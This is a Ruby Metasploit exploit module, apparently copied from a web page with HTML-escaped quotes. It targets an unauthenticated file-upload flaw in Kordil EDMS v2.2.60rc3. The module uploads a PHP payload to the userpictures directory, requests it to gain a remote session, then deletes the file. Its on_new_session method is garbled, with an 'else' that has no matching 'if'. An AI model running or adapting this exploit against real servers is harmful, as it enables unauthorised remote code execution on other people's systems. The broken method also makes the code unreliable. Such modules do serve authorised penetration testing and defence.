# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "Kordil EDMS v2.2.60rc3 Unauthenticated Arbitrary File Upload Vulnerability",
            &#039;Description&#039;    => %q{
                This module exploits a vulnerability in Kordil EDMS v2.2.60rc3.
                This application has an upload feature that allows an unauthenticated user
                to upload arbitrary files to the &#039;/kordil_edms/userpictures/&#039; directory.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Brendan Coles <bcoles[at]gmail.com>&#039; # Discovery and exploit
                ],
            &#039;References&#039;     =>
                [
                    #[&#039;OSVDB&#039;, &#039;&#039;],
                    #[&#039;EDB&#039;,   &#039;&#039;],
                ],
            &#039;Platform&#039;       => &#039;php&#039;,
            &#039;Arch&#039;           => ARCH_PHP,
            &#039;Targets&#039;        =>
                [
                    [&#039;Automatic Targeting&#039;, { &#039;auto&#039; => true }]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Feb 22 2013",
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptString.new(&#039;TARGETURI&#039;, [true, &#039;The path to the web application&#039;, &#039;/kordil_edms/&#039;]),
            ], self.class)
    end
 
    def check
 
        base  = target_uri.path
        peer  = "#{rhost}:#{rport}"
 
        # retrieve software version from login page
        begin
            res = send_request_cgi({
                &#039;method&#039; => &#039;GET&#039;,
                &#039;uri&#039;    => normalize_uri(base, &#039;global_group_login.php&#039;)
            })
            if res and res.code == 200
                if res.body =~ /<center><font face="Arial" size="2">Kordil EDMS v2\.2\.60/
                    return Exploit::CheckCode::Vulnerable
                elsif res.body =~ /Kordil EDMS v/
                    return Exploit::CheckCode::Detected
                end
            end
            return Exploit::CheckCode::Safe
        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
            print_error("#{peer} - Connection failed")
        end
        return Exploit::CheckCode::Unknown
 
    end
 
    def upload(base, file)
        data = Rex::MIME::Message.new
        data.add_part(file,       &#039;text/x-php&#039;, nil, "form-data; name=\"upload_fd31\"; filename=\"#{@fname}.php\"")
        data.add_part("#{@fname}", nil, nil, &#039;form-data; name="add_fd0"&#039;)
        data.add_part("#{@fname}", nil, nil, &#039;form-data; name="add_fd27"&#039;)
        data.add_part("n", nil, nil, &#039;form-data; name="act"&#039;)
        data_post = data.to_s
        data_post = data_post.gsub(/^\r\n\-\-\_Part\_/, &#039;--_Part_&#039;)
 
        res = send_request_cgi({
            &#039;method&#039;  => &#039;POST&#039;,
            &#039;uri&#039;     => normalize_uri(base, &#039;users_add.php&#039;),
            &#039;ctype&#039;   => "multipart/form-data; boundary=#{data.bound}",
            &#039;data&#039;    => data_post
        })
        return res
    end
 
    def on_new_session(client)
            client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")
            client.fs.file.rm("#{@fname}.php")
        else
            client.shell_command_token("rm #{@fname}.php")
        end
    end
 
 
    def exploit
 
        base   = target_uri.path
        @peer  = "#{rhost}:#{rport}"
        @fname = rand_text_numeric(7)
 
        # upload PHP payload to userpictures/[fname].php
        print_status("#{@peer} - Uploading PHP payload (#{payload.encoded.length} bytes)")
        php    = %Q|<?php #{payload.encoded} ?>|
        begin
            res = upload(base, php)
            if res and res.code == 302 and res.headers[&#039;Location&#039;] =~ /\.\/user_account\.php\?/
                print_good("#{@peer} - File uploaded successfully")
            else
                fail_with(Exploit::Failure::UnexpectedReply, "#{@peer} - Uploading PHP payload failed")
            end
        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
            fail_with(Exploit::Failure::Unreachable, "#{@peer} - Connection failed")
        end
 
        # retrieve and execute PHP payload
        print_status("#{@peer} - Executing payload (userpictures/#{@fname}.php)")
        begin
            res = send_request_cgi({
                &#039;method&#039; => &#039;GET&#039;,
                &#039;uri&#039;    => normalize_uri(base, &#039;userpictures&#039;, "#{@fname}.php")
            })
        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
            fail_with(Exploit::Failure::Unreachable, "#{@peer} - Connection failed")
        end
 
    end
end

